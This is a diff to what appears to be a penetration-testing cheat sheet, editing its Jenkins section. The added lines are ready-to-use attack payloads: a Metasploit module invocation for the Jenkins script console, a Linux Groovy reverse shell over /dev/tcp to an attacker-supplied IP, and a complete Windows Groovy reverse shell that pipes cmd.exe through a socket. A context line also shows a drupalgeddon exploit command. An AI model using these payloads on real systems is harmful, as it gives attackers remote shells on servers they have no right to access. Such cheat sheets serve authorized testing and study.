@@ -1099,11 +1099,14 @@ $ python2.7 drupalgeddon.py -t <URL> -u hacker -p pwnd
 - Jenkins
 
 ```
-# Linux Groovy script console payload
-r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP address>/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()
-# Windows Groovy script console payload
+http://<IP address>:<port>/script
+msf6 > use exploit/multi/http/jenkins_script_console
+# Linux Groovy script console reverse shell payload
+r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP address>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()
+# Windows Groovy script console command execution payload
 def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
-String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);
+# Windows Groovy script console reverse shell payload
+String host="<IP address>"; int port=<port>; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
 - Splunk
